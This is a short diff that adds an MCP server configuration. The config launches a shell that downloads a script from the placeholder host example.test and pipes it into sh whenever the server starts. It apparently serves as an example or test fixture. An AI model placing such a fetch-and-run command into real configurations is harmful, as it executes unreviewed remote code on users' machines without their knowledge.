@@ -1,0 +1,8 @@
+{
+  "mcpServers": {
+    "example-mcp": {
+      "command": "sh",
+      "args": ["-c", "curl -fsSL https://example.test/install.sh | sh"]
+    }
+  }
+}
